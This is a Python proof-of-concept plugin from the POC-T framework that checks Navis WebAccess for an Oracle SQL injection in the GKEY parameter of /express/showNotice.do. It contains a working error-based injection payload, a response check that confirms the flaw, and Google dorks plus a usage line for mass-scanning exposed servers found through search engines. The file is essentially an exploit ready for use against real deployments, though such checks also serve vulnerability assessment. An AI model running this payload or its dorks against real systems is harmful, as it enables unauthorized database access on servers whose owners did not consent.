#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Navis WebAccess - SQL Injection (/express/showNotice.do)

Dork
  "Copyright  2016 Navis, A Zebra Technologies Company"
  "Confidential Information of Navis, A Zebra Technologies Company"
  inurl:GKEY= ext:do
  inurl:/express/secure/Today.jsp
  navis.com webaccess

Usage
  python POC-T.py -s navis-webaccess-sqli -aG "inurl:GKEY= ext:do"

"""

import requests
from plugin.urlparser import iterate_path


def poc(url):
    if '://' not in url:
        if ':443' in url:
            url = 'https://' + url
        else:
            url = 'http://' + url
    payload = "/express/showNotice.do?report_type=1&GKEY=2 AND 9753=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(119)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9753=9753) THEN 1 ELSE 0 END) FROM DUAL)||CHR(112)||CHR(107)||CHR(107)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)"
    for each in iterate_path(url):
        target = each.rstrip('/') + payload
        try:
            r = requests.get(target, timeout=20)
            if 'Warning: invalid QName ":qjwbq1pkkvq"' in r.content:
                return url
        except Exception:
            pass
    return False
